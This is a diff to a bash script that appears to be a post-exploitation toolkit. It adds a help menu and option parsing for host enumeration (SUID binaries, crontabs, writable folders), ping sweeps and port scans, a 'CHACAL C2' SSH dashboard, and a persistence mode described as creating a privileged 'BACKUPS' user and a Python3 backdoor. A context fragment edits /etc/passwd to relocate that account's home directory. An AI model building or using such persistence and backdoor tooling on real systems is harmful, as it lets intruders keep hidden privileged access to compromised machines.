@@ -24,6 +24,20 @@
 #        [FUNCTIONS]
 # ---------------------------
 
+# -- HELP MENU --
+function help() {
+  echo -e "
+  [$Gn*$We] HELP MENU
+
+     $Rd["$We"+"$Rd"]$Gn -h --help$We  -   HELP MENU ("$Yw"Show these help"$We")
+     $Rd["$We"+"$Rd"]$Gn -m$We         -   MACHINE INFORMATIONS ("$Yw"Show Hardware/System Infos"$We")
+     $Rd["$We"+"$Rd"]$Gn -ds$We        -   DEEP SEARCH ("$Yw"Show Tools, Crontab Files, SUID Binaries, Writable Folders"$We")
+     $Rd["$We"+"$Rd"]$Gn -n$We         -   NETWORK ("$Yw"Show Network Information and use Ping Sweep and Port Scan modes"$We")
+     $Rd["$We"+"$Rd"]$Gn -c2$We        -   CHACAL C2 ("$Yw"Manage SSH Connections Through a Dashboard"$We")
+     $Rd["$We"+"$Rd"]$Gn -p$We         -   PERSISTENCE ("$Yw"Create a Privileged User Called BACKUPS and Create a Backdoor in Python3"$We")
+  "
+}
+
 # -- LOADING --
 function loading() {
   spinner=( '|' '/' '-' '\' )
@@ -374,9 +388,7 @@ removetarget() {
     clear
 }
 
-# ---------------------------
-#         [Persistence]
-# ---------------------------
+
 function persistence() {
  while true; do
     echo -e "
@@ -507,6 +519,48 @@ backup_user() {
         rm -rf /home/backups
         sed -i 's/:\/home\/backups:/:\/var\/backups:/g' /etc/passwd
 }
+
+# ---------------------------
+#         [OPTIONS]
+# ---------------------------
+
+# -- How to use -- 
+# [?] ./gpk -h | --help = Show Help Menu
+# [?] ./gpk + parameter = Desired Option
+
+while [ $# -gt 0 ]; do
+  case "$1" in
+      -h|--help)
+      help
+      exit
+      ;;
+      -m)
+      machineinfo
+      exit
+      ;;
+      -ds)
+      deepsearch
+      ;;
+      -n)
+      network
+      ;;
+      -c2)
+      chacal-c2
+      ;;
+      -p)
+      root_check
+      persistence
+      ;;
+      *)
+      echo -e "
+ [$Rd""Error!""$We] Invalid option: "$Yw""$1""$We"
+ 
+  Try $Gn-h$We or $Gn--help$We for more informations"
+      exit
+      ;;
+  esac
+  shift
+done
 
 # ---------------------------
 #          [BANNER]
